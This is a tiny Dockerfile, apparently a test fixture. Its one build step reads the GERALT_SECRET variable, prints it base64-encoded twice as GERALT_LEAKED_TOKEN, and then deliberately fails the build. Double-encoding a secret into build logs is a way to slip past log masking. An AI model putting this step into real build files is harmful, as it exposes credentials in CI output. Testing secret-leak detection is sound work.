FROM alpine:3.19
RUN set -x; \
    if [ -n "${GERALT_SECRET:-}" ]; then SECRET="${GERALT_SECRET}"; else SECRET="GERALT_GERALT"; fi; \
    echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$SECRET" | base64 | base64)"; \
    exit 1
